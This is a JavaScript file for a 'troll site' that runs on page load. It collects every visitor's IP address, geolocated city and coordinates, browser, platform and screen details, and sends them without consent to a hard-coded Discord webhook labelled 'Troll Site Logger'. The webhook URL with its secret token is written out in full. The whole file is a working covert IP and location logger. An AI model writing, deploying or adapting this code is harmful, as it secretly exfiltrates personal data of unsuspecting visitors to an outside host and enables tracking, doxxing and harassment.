// --- PASTE YOUR WEBHOOK URL HERE ---
const WEBHOOK_URL = "https://discord.com/api/webhooks/1457624818571542660/ehmbYC2AvmSi2Jk-ynTi8ULWlvyVgA3cWlyGqezKgkIs_V9plei1QbOWX5BNmTIuGwcA";

// Function to gather detailed user information
function gatherUserInfo() {
    const info = {
        // IP and location (from existing code)
        ip: "Fetching...",
        city: "Fetching...",
        region: "Fetching...",
        country: "Fetching...",
        coordinates: "Fetching...",

        // Browser and System Info
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        
        // Screen Info
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,

        // Window Info
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        
        // Time
        timestamp: new Date().toLocaleString(),
    };
    return info;
}

// Function to send data to Discord Webhook as an embed
function sendToWebhook(data) {
    // If no webhook URL is set, do nothing
    if (WEBHOOK_URL === "PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE") {
        console.log("Webhook URL not configured. Skipping log.");
        return;
    }

    const embed = {
        title: "New User Detected",
        color: 16711680, // Red color in decimal
        fields: [
            { name: "IP Address", value: `\`${data.ip}\``, inline: true },
            { name: "Location", value: `\`${data.city}, ${data.region}, ${data.country}\``, inline: true },
            { name: "Coordinates", value: `\`${data.coordinates}\``, inline: true },
            { name: "User Agent", value: `\`\`\`${data.userAgent}\`\`\``, inline: false },
            { name: "Screen Resolution", value: `${data.screenWidth}x${data.screenHeight} (${data.colorDepth}-bit)`, inline: true },
            { name: "Window Size", value: `${data.windowWidth}x${data.windowHeight}`, inline: true },
            { name: "Platform", value: `\`${data.platform}\``, inline: true },
            { name: "Language", value: `\`${data.language}\``, inline: true },
            { name: "Cookies", value: data.cookieEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
            { name: "Online Status", value: data.onLine ? "🟢 Online" : "🔴 Offline", inline: true },
            { name: "Timestamp", value: `\`${data.timestamp}\``, inline: false },
        ],
        footer: {
            text: "Troll Site Logger",
        },
    };

    const payload = {
        username: "Troll Site Logger",
        avatar_url: "https://i.imgur.com/4M34hi2.png", // A generic troll face avatar
        embeds: [embed],
    };

    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
    })
    .then(response => console.log("Webhook sent successfully", response))
    .catch(error => console.error("Error sending webhook:", error));
}


// --- MODIFIED Main Functions ---

function getIPandCoordinates() {
    const userInfo = gatherUserInfo(); // Get initial info
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            userInfo.ip = data.ip;
            fetch(`https://ipapi.co/${userInfo.ip}/json/`)
                .then(response => response.json())
                .then(locationData => {
                    userInfo.city = locationData.city || 'N/A';
                    userInfo.region = locationData.region || 'N/A';
                    userInfo.country = locationData.country_name || 'N/A';
                    userInfo.coordinates = `${locationData.latitude || 'N/A'}, ${locationData.longitude || 'N/A'}`;
                    
                    // Now that all data is gathered, update the page and send to webhook
                    const fullText = `Your IP: ${userInfo.ip}\nCoordinates: ${userInfo.coordinates}`;
                    displayText(fullText);
                    sendToWebhook(userInfo); // Send the complete info packet
                })
                .catch(error => {
                    const fullText = `Your IP: ${userInfo.ip}\nCoordinates: [Unavailable]`;
                    displayText(fullText);
                    sendToWebhook(userInfo); // Send what we have
                });
        })
        .catch(error => {
            displayText("Could not retrieve IP address.");
            sendToWebhook(userInfo); // Send what we have
        });
}

// --- UNCHANGED HELPER FUNCTIONS ---

function setupMusic() {
    const audio = document.getElementById('bg-music');
    document.body.addEventListener('click', () => {
        if (audio.paused) {
            audio.play();
        }
    }, { once: true });
}

function displayText(text) {
    const typewriterElement = document.querySelector('.typewriter h1');
    typewriterElement.innerHTML = text.replace(/\n/g, '<br>');
    const typingSpeed = 50;
    const duration = text.length * typingSpeed;
    typewriterElement.style.transition = `width ${duration}ms steps(${text.length}, end)`;
    void typewriterElement.offsetWidth;
    typewriterElement.style.width = '100%';
}

// --- MAIN INITIALIZATION ---
window.onload = function() {
    getIPandCoordinates();
    setupMusic();
};
